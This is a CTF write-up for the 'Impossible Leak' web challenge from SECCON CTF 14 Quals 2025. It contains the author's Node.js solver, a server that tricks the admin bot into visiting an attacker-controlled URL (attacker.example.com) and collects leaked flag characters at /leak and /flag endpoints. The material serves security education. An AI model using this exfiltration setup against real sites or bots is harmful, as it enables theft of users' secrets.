---
title: "Impossible Leak - SECCON CTF 14 Quals 2025"
category: "web"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "impossible", "leak", "web", "seccon-ctf-14-quals"]
summary: "In CTFs, \"impossible\" means \"possible\"."
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202512_SECCON_CTF_14_Quals/web/impossible-leak"
license: "none stated"
ctf:
  name: "SECCON CTF 14 Quals"
  year: 2025
  challenge: "Impossible Leak"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202512_SECCON_CTF_14_Quals/web/impossible-leak>
- **CTF:** SECCON CTF 14 Quals 2025

---

# [web] impossible-leak

## Description

In CTFs, "impossible" means "possible".

- Challenge: `http://impossible-leak.seccon.games:3000`
- Admin bot: `http://impossible-leak.seccon.games:1337`

## Attachments

- [impossible-leak](distfiles)

## Usage

Launch a challenge server:

```
cd challenge
docker compose up
```

Run the author's solver:

```
docker run -it --rm \
    -e BOT_BASE_URL=http://localhost:1337 \
    -e CONNECTBACK_URL=http://attacker.example.com \
    -p 8080:8080 --network=host \
    (docker build -q ./solution)
```
where `http://attacker.example.com` is an origin forwarded to `http://localhost:8080`.


## Solver: `index.js`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202512_SECCON_CTF_14_Quals/web/impossible-leak/solution/index.js>

```javascript
import fastify from "fastify";
import fs from "node:fs/promises";
import assert from "node:assert/strict";

const BOT_BASE_URL = process.env.BOT_BASE_URL ?? "http://localhost:1337";
const CONNECTBACK_URL = process.env.CONNECTBACK_URL ?? assert.fail("No URL");
const PORT = "8080";

let known = "SECCON{";

const app = fastify();

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

app.get("/", async (req, reply) => {
  reply.type("text/html; charset=utf-8").send(await fs.readFile("index.html"));
});

app.post("/debug", async (req, reply) => {
  console.log("[DEBUG]", req.body);
  return "";
});

app.post("/leak", async (req, reply) => {
  known = req.body;
  console.log({ known });
  return "";
});

app.post("/flag", async (req, reply) => {
  // You got a flag!
  const flag = req.body;
  console.log({ flag });
  process.exit(0);
});

app.listen({ port: PORT, host: "0.0.0.0" }).then(async (address) => {
  await sleep(3_000);

  for (let i = 0; i < 5; i++) {
    console.log(`Report: ${i + 1}`);
    await reportUrl(`${CONNECTBACK_URL}?known=${encodeURIComponent(known)}`);
  }
  assert.fail("Failed");
});
```
